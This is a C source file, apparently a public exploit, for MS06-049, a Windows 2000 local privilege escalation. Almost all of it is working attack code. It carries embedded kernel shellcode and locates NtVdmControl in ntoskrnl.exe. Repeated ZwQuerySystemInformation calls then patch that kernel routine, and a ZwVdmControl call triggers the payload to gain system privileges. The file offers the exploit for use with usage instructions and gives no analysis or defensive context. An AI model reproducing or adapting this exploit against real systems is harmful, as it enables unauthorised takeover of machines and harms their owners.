/*
    MS06-049 Windows ZwQuerySystemInformation Local Privilege Escalation Vulnerability Exploit
            Created by SoBeIt

    Main file of exploit

    Tested on:

    Windows 2000 PRO SP4 Chinese
    Windows 2000 PRO SP4 Rollup 1 Chinese
    Windows 2000 PRO SP4 English
    Windows 2000 PRO SP4 Rollup 1 English

    Usage:ms06-049.exe
*/

#include <windows.h>
#include <stdio.h>

#define NTSTATUS    int
#define ProcessBasicInformation    0
#define SystemModuleInformation 11
    
typedef NTSTATUS (NTAPI *ZWVDMCONTROL)(ULONG, PVOID);
typedef NTSTATUS (NTAPI *ZWQUERYINFORMATIONPROCESS)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *ZWQUERYSYSTEMINFORMATION)(ULONG, PVOID, ULONG, PULONG);

ZWVDMCONTROL    ZwVdmControl;
ZWQUERYINFORMATIONPROCESS    ZwQueryInformationProcess;
ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation;

typedef struct _PROCESS_BASIC_INFORMATION {
      NTSTATUS ExitStatus;
      PVOID PebBaseAddress;
      ULONG AffinityMask;
      ULONG BasePriority;
      ULONG UniqueProcessId;
      ULONG InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Reserved[2];
    PVOID Base;
    ULONG Size;
    ULONG Flags;
    USHORT Index;
    USHORT Unknow;
    USHORT LoadCount;
    USHORT ModuleNameOffset;
    char ImageName[256];    
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

unsigned char kfunctions[64][64] = 
{
                            //ntoskrnl.exe
    {"ZwTerminateProcess"},
    {""},
};

unsigned char shellcode[] = 
        "\x90\x60\x9c\xe9\xd1\x00\x00\x00\x5f\x4f\x47\x33\xc0\x66\x81\x3f"
        "\x90\xcc\x75\xf6\x40\x40\x66\x81\x3c\x07\xcc\x90\x75\xec\x83\xc7"
        "\x04\xbe\x38\xf0\xdf\xff\x8b\x36\xad\xad\x48\x81\x38\x4d\x5a\x90"
        "\x00\x75\xf7\x95\x8b\xf7\x6a\x01\x59\xe8\x56\x00\x00\x00\xe2\xf9"
        "\xbb\x24\xf1\xdf\xff\x8b\x1b\x8b\x43\x44\xb9\x08\x00\x00\x00\xe8"
        "\x2c\x00\x00\x00\x8b\xd0\x8b\x4e\x04\xe8\x22\x00\x00\x00\x8b\x8a"
        "\x2c\x01\x00\x00\x89\x88\x2c\x01\x00\x00\x56\x8b\x7e\x0c\x8b\x4e"
        "\x10\x8b\x76\x08\xf3\xa4\x5e\x33\xc0\x50\x50\xff\x16\x9d\x61\xc3"
        "\x8b\x80\xa0\x00\x00\x00\x2d\xa0\x00\x00\x00\x39\x88\x9c\x00\x00"
        "\x00\x75\xed\xc3\x51\x56\x8b\x75\x3c\x8b\x74\x2e\x78\x03\xf5\x56"
        "\x8b\x76\x20\x03\xf5\x33\xc9\x49\x41\xad\x03\xc5\x33\xdb\x0f\xbe"
        "\x10\x85\xd2\x74\x08\xc1\xcb\x07\x03\xda\x40\xeb\xf1\x3b\x1f\x75"
        "\xe7\x5e\x8b\x5e\x24\x03\xdd\x66\x8b\x0c\x4b\x8b\x5e\x1c\x03\xdd"
        "\x8b\x04\x8b\x03\xc5\xab\x5e\x59\xc3\xe8\x2a\xff\xff\xff\x90\x90"

        "\x90\xcc\xcc\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xcc\x90\x90\xcc";

void ErrorQuit(char *msg)
{
    printf("%s:%x\n", msg, GetLastError());
    ExitProcess(0);
}

ULONG ComputeHash(char *ch)
{
    ULONG ret = 0;

    while(*ch)
    {
        ret = ((ret << 25) | (ret >> 7)) + *ch++;
    }

    return ret;
}

ULONG RVA2Offset(ULONG RVA, PIMAGE_SECTION_HEADER pSectionHeader, ULONG Sections)
{    
    ULONG i;
    
    if(RVA < pSectionHeader[0].PointerToRawData)
        return RVA;

    for(i = 0; i < Sections; i++)
    {   
        if(RVA >= pSectionHeader[i].VirtualAddress &&
           RVA < pSectionHeader[i].VirtualAddress + pSectionHeader[i].SizeOfRawData)           
           return (RVA - pSectionHeader[i].VirtualAddress + pSectionHeader[i].PointerToRawData);
    }
    
    return 0;
}

ULONG Offset2RVA(ULONG Offset, PIMAGE_SECTION_HEADER pSectionHeader, ULONG Sections)
{   
    ULONG i;
    
    if(Offset < pSectionHeader[0].PointerToRawData)
        return Offset;
    
    for(i = 0; i < Sections; i++)
    {
        if(Offset >= pSectionHeader[i].PointerToRawData &&
           Offset < pSectionHeader[i].PointerToRawData + pSectionHeader[i].SizeOfRawData)
           return (Offset - pSectionHeader[i].PointerToRawData + pSectionHeader[i].VirtualAddress);
    }
    
    return 0;
}

void GetFunction()
{
    HANDLE    hNtdll;
    
    hNtdll = LoadLibrary("ntdll.dll");
    if(hNtdll == NULL)
        ErrorQuit("LoadLibrary failed.\n");
        
    ZwVdmControl = (ZWVDMCONTROL)GetProcAddress(hNtdll, "ZwVdmControl");
    if(ZwVdmControl == NULL)
        ErrorQuit("GetProcAddress failed.\n");
        
    ZwQueryInformationProcess = (ZWQUERYINFORMATIONPROCESS)GetProcAddress(hNtdll, "ZwQueryInformationProcess");
    if(ZwQueryInformationProcess == NULL)
        ErrorQuit("GetProcAddress failed.\n");
        
    ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll, "ZwQuerySystemInformation");
    if(ZwQuerySystemInformation == NULL)
        ErrorQuit("GetProcessAddress failed.\n");
        
    FreeLibrary(hNtdll);
}

ULONG GetKernelBase()
{
    ULONG    i, Byte, ModuleCount;
    PVOID    pBuffer;
    PSYSTEM_MODULE_INFORMATION    pSystemModuleInformation;
    PCHAR    pName;
    
    ZwQuerySystemInformation(SystemModuleInformation, (PVOID)&Byte, 0, &Byte);
        
    if((pBuffer = malloc(Byte)) == NULL)
        ErrorQuit("malloc failed.\n");
        
    if(ZwQuerySystemInformation(SystemModuleInformation, pBuffer, Byte, &Byte))
        ErrorQuit("ZwQuerySystemInformation failed\n");
    
    ModuleCount = *(PULONG)pBuffer;
    pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)((PUCHAR)pBuffer + sizeof(ULONG));
    for(i = 0; i < ModuleCount; i++)
    {
        if((pName = strstr(pSystemModuleInformation->ImageName, "ntoskrnl.exe")) != NULL)
        {
            free(pBuffer);    
            return (ULONG)pSystemModuleInformation->Base;
        }
        
        pSystemModuleInformation++;
    }
        
    free(pBuffer);
    return 0;
}

int main(int argc, char *argv[])
{
    PULONG    pStoreBuffer, pNamesArray, pFunctionsArray, pShellcode, pRestoreBuffer;
    PUCHAR    pBase;
    PCHAR        pName;
    PUSHORT        pOrdinals;
    PIMAGE_NT_HEADERS    pHeader;
    PIMAGE_EXPORT_DIRECTORY    pExport;
    PIMAGE_SECTION_HEADER pSectionHeader;
    PROCESS_BASIC_INFORMATION pbi;
    SYSTEM_MODULE_INFORMATION    smi;
    char        DriverName[256];
    ULONG        Byte, FileSize, len, i, j, k, Count, BaseAddress, Value, KernelBase, buf[64], HookAddress, Temp, Sections;
    USHORT    index;
    HANDLE    hDevice, hFile, hFileMap;

    printf("\n MS06-049 Windows ZwQuerySystemInformation Local Privilege Escalation Vulnerability Exploit \n\n");
    printf("\t Create by SoBeIt. \n\n");
    if(argc != 1)
    {
        printf(" Usage:%s \n\n", argv[0]);
        return 1;
    }

    GetFunction();

    if(ZwQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, (PVOID)&pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL))
        ErrorQuit("ZwQueryInformationProcess failed\n");
    
    KernelBase = GetKernelBase();
    if(!KernelBase)
        ErrorQuit("Unable to get kernel base address.\n");
        
    printf("Kernel base address: %x\n", KernelBase);

    pRestoreBuffer = malloc(0x100);
    if(pRestoreBuffer == NULL)
        ErrorQuit("malloc failed.\n");
    
    pStoreBuffer = VirtualAlloc(NULL, 0x1001000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(pStoreBuffer == NULL)
        ErrorQuit("VirtualAlloc failed.\n");
        
    printf("Allocated address:%x\n", pStoreBuffer);
    
    if(!GetSystemDirectory((PUCHAR)pStoreBuffer, 256))
        ErrorQuit("GetSystemDirectory failed.\n");

    strcat((PUCHAR)pStoreBuffer, "\\ntoskrnl.exe");
    hFile = CreateFile((PUCHAR)pStoreBuffer, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE)
    {
        hFile = CreateFile("ntoskrnl.exe", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if(hFile == INVALID_HANDLE_VALUE)
            ErrorQuit("CreateFile failed.\n");
    }

    if((FileSize = GetFileSize(hFile, NULL)) == 0xffffffff)
        ErrorQuit("GetFileSize failed.\n");

    printf("File size:%x\n", FileSize);
    pBase = (PUCHAR)VirtualAlloc(NULL, FileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(pBase == NULL)
        ErrorQuit("VirtualAlloc failed.\n");
        
    if(!ReadFile(hFile, pBase, FileSize, &Byte, NULL))
        ErrorQuit("ReadFile failed.\n");

    pHeader = (PIMAGE_NT_HEADERS)(pBase + ((PIMAGE_DOS_HEADER)pBase)->e_lfanew);
    pSectionHeader = (PIMAGE_SECTION_HEADER)((PUCHAR)(&pHeader->OptionalHeader) + pHeader->FileHeader.SizeOfOptionalHeader);
    Sections= pHeader->FileHeader.NumberOfSections;

    pExport = (PIMAGE_EXPORT_DIRECTORY)(pBase + 
        RVA2Offset(pHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress,
        pSectionHeader,
        Sections
        ));

    pNamesArray = (PULONG)(pBase + 
                    RVA2Offset(pExport->AddressOfNames,
                        pSectionHeader,
                        Sections));
                        
    pFunctionsArray = (PULONG)(pBase +                        
                    RVA2Offset(pExport->AddressOfFunctions,
                        pSectionHeader,
                        Sections));
                        
    pOrdinals = (PUSHORT)(pBase + 
                    RVA2Offset(pExport->AddressOfNameOrdinals,
                        pSectionHeader,
                        Sections));
                        
    len = strlen("NtVdmControl");
    for(i = 0; i < pExport->NumberOfNames; i++)
    {
        pName = pBase + RVA2Offset(pNamesArray[i], pSectionHeader, Sections);
        if(!strncmp(pName, "NtVdmControl", len))
            break;
    }

    if(i > pExport->NumberOfFunctions)
        ErrorQuit("Some error occured.\n");

    index = pOrdinals[i]; 
    HookAddress = pFunctionsArray[index] + KernelBase;
    memcpy((PUCHAR)pRestoreBuffer, pBase + pFunctionsArray[index] - 1, 0x10);
    printf("%s Address:%x\n", "NtVdmControl", HookAddress);
    
    pShellcode = (PULONG)shellcode;
    for(k = 0; pShellcode[k++] != 0x90cccc90; )
                ;

    for(j = 0; kfunctions[j][0] != '\x0'; j++)
        buf[j] = ComputeHash(kfunctions[j]);

    buf[j++] = pbi.InheritedFromUniqueProcessId;
    buf[j++] = (ULONG)pRestoreBuffer;
    buf[j++] = HookAddress - 1;
    buf[j++] = 0x10;    

    memcpy((char *)(pShellcode + k), (char *)buf, j * 4);
    
    Temp = 0;
    for(i = 0; i < 7; i++)
    {
        ZwQuerySystemInformation(SystemModuleInformation, (PVOID)&Byte, 0, &Byte);
        Byte = Byte / sizeof(SYSTEM_MODULE_INFORMATION);
        Temp += Byte;
    }
    
    Byte = Temp / 7;
    printf("Single value:%x\n", Byte);
    Value = (0xe9 << 8) & 0xff00;
    printf("Jump value:%x\n", Value);
    printf("Base value:%x\n", pRestoreBuffer[0]);
    for(Count = 0; ; Count++)
    {
        if(((pRestoreBuffer[0] + Count * Byte) & 0xff00) == Value)
            break;    
    }
    
    printf("Need value generated:%x\n", pRestoreBuffer[0] + Count * Byte);
    printf("Count value:%x\n", Count);
    for(i = 0; i < Count; i ++)
        ZwQuerySystemInformation(SystemModuleInformation, (PVOID)(HookAddress - 1), 0, &Byte);

    Temp = 0;
    for(i = 0; i < 7; i++)
    {
        ZwQuerySystemInformation(SystemModuleInformation, (PVOID)&Byte, 0, &Byte);
        Byte = Byte / sizeof(SYSTEM_MODULE_INFORMATION);
        Temp += Byte;
    }
    
    Byte = Temp / 7;
    printf("Single value:%x\n", Byte);
    Value = (((ULONG)pStoreBuffer + 0x800000 - HookAddress) >> 16) & 0xfff0;
    printf("Jump value:%x\n", Value);
    printf("Base value:%x\n", pRestoreBuffer[1]);
    for(Count = 0; ; Count++)
    {
        if(((pRestoreBuffer[1] + Count * Byte) & 0xfff0) == Value)
            break;
    }

    printf("Need value generated:%x\n", pRestoreBuffer[1] + Count * Byte);
    printf("Count value:%x\n", Count);
    for(i = 0; i < Count; i ++)
        ZwQuerySystemInformation(SystemModuleInformation, (PVOID)(HookAddress + 3), 0, &Byte);

    memset(pStoreBuffer, 0x90, 0x1001000);
    memcpy((PUCHAR)pStoreBuffer + 0x1000000, shellcode, sizeof(shellcode));
        
    CloseHandle(hFile);

    printf("Exploitation finished.\n");
    ZwVdmControl(0, NULL);
    
    return 1;
}